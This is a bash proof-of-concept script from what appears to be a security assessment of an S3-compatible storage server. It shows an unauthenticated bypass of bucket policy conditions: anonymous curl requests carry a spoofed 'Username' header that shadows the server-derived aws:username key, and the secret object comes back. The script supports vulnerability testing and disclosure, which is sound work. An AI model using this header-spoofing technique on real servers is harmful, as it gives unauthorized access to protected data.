#!/usr/bin/env bash
# F-15 — Unauthenticated policy-condition bypass: a request header shadows a server-derived
# condition key (aws:username / aws:SecureTransport / s3:x-amz-*), because getConditionValues
# merges all headers/query into the condition map and the engine canonicalizes key names first.
# Prereq: setup/01-single-node.sh
set -euo pipefail
. "$(dirname "$0")/../../setup/env.sh"
T=${1:-$S1}

echo "=== setup: PUBLIC (Principal:*) GetObject allowed ONLY when aws:username == backup-reader ==="
mcsh '
mc alias set L '"$T"' '"$ROOT_USER"' '"$ROOT_PASS"' >/dev/null 2>&1
mc mb -p L/condbkt >/dev/null 2>&1; printf "USERNAME-COND-SECRET\n" | mc pipe L/condbkt/secret.txt >/dev/null 2>&1
cat > /tmp/cond.json <<POL
{"Version":"2012-10-17","Statement":[{"Effect":"Allow","Principal":{"AWS":["*"]},"Action":["s3:GetObject"],"Resource":["arn:aws:s3:::condbkt/*"],"Condition":{"StringEquals":{"aws:username":"backup-reader"}}}]}
POL
mc anonymous set-json /tmp/cond.json L/condbkt 2>&1 | tail -1
'
echo "=== attack: ANONYMOUS GET, shadowing aws:username with a request header ==="
echo -n "  [no header]                       : "; curl -s -o /dev/null -w "HTTP %{http_code}\n" "$T/condbkt/secret.txt"
echo -n "  [Username: backup-reader]         : "; curl -s -w " HTTP %{http_code}\n" -H "Username: backup-reader" "$T/condbkt/secret.txt"
echo -n "  [Username: wronguser (control)]   : "; curl -s -o /dev/null -w "HTTP %{http_code}\n" -H "Username: wronguser" "$T/condbkt/secret.txt"
echo
echo "VULNERABLE if: no-header=403, Username:backup-reader returns the secret (200), control=403."
